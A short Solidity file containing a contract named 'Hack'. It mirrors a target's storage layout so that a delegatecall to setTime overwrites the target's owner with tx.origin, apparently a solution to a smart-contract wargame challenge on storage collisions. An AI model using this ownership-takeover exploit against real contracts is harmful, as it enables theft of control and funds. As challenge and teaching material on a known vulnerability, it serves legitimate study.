// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract Hack {
    
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
    
    function setTime(uint _val) public {
        owner = tx.origin;
    }

}